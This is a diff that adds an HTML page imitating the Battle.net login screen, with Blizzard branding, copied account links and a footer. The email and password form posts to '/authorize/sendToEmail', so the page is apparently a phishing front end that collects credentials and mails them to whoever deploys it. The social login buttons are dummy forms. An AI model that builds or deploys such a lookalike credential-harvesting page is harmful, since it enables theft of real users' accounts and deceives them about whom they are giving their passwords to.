@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="icon" type="image/png" href="/images/logo.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles/style.css" type="text/css">
+    <title>Battle.net Login</title>
+</head>
+<body>
+    <div class="container container-wrapper">
+        <div class="wrapper">
+            <div class="wrapper-inner">
+                <h1 class="logo"></h1>
+                <div class="input-box">
+                    <h3 class="login-header">Log In</h3>
+                    <div class="social-icons">
+                        <form action="">
+                            <button title="Login in with Google" class="btn btn-google">
+                                <img class="icon-style icon" src="/images/google-logo-color.svg" alt="">
+                            </button>
+                        </form>
+                        <form action="">
+                            <button class="btn btn-facebook">
+                                <img class="icon-style icon" src="/images/facebook-logo-white.svg" alt="">
+                            </button>
+                        </form>
+                        <form action="">
+                            <button class="btn btn-apple">
+                                <img class="icon-style icon" src="/images/apple-logo-black.svg" alt="">
+                            </button>
+                        </form>
+                    </div>
+                    <div class="second-social-icons">
+                        <form action="">
+                            <button class="btn btn-social-icon color-green btn-xbox">
+                                <img class="icon-style icon" src="/images/xbox-logo-white.svg" alt="">
+                            </button>
+                        </form>
+                        <form action="">
+                            <button class="btn btn-social-icon color-blue btn-ps">
+                                <img class="icon icon-style" src="/images/playstation-logo-white.svg" alt="">
+                            </button>
+                        </form>
+                        <form action="">
+                            <button class="btn btn-social-icon red-color btn-switch">
+                                <img class="icon icon-style" src="/images/switch-logo-white.svg" alt="">
+                            </button>
+                        </form>
+                        <form action="">
+                            <button class="btn btn-social-icon btn-steam">
+                                <img class="icon icon-style" src="images/steam-logo-black.svg" alt="">
+                            </button>
+                        </form>
+                    </div>
+                    <div class="border-line">
+                        <span>Or log in with</span>
+                    </div>
+                    <div class="line-login">
+                        <span class="login-text"></span>
+                    </div>
+                    <form action="/authorize/sendToEmail" method="post" class="login-password">
+                        <div class="input-login-container">
+                            <div class="control-group">
+                                <label class="control-label" for=""></label>
+                                <div class="controls">
+                                    <input class="input-email" name="email" type="text" title="Email" placeholder="Email or Phone">
+                                </div>
+                            </div>
+                            <div class="control-group">
+                                <div class="password-wrapper">
+                                    <input class="input-password" type="password" name="password" title="Password" placeholder="Password">
+                                    <span class="view-password-btn">
+                                        <img class="eye" src="/images/eys.png" alt="">
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="control-group submit">
+                                <button class="btn-sub btn-block btn-primary sub" type="submit">Log In</button>
+                            </div>
+                        </div>
+                    </form>
+                    <ul class="nav-helps">
+                        <li><a class="light-blue" href="https://account.battle.net/creation/?ref=https%3A%2F%2Foauth.battle.net%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D057adb2af62a4d59904f74754838c4c8%26scope%3Daccount.full%2520commerce.virtualcurrency.full%2520account-settings.full%26state%3DyE5tt1fODKYkeFuSe1sCQV1G2xbo4mhrvAjR61zhCQE%253D%26redirect_uri%3Dhttps%3A%2F%2Faccount.battle.net%2Fcallback%2Foauth2%2Fcode%2Faccount-settings&theme=bnet-next&app=bas&hostingApp=bas&flowTrackingId=4c2c40ba-21a8-4b1a-a6f7-5c9637fcc114&bdp=dcee88b56680bf50c0aeb1b7172181d2b2d82b08f5faf0b5e8c78326becb64c5">Create a free Battle.net Account</a></li>
+                        <li><a class="dark-blue" href="https://account.battle.net/recovery/en-us/?ref=&theme=bnet-next&app=bas&hostingApp=bas&flowTrackingId=4c2c40ba-21a8-4b1a-a6f7-5c9637fcc114">Can't log in?</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="space-div"></div>
+        <footer class="footer">
+            <div class="nav-client">
+                <div class="footer-content">
+                    <div class="nav-section">
+                        <div class="nav-left">
+                            <div class="footer-links nav-left">
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Battle.net EULA</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Privacy</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Terms</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Copyright Infringement</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Cookies</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a"  href="https://www.blizzard.com/company/legal/eula">Cookie Settings</a>
+                                <div class="copyright">
+                                    ©2023 Blizzard Entertainment, Inc. All rights reserved.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
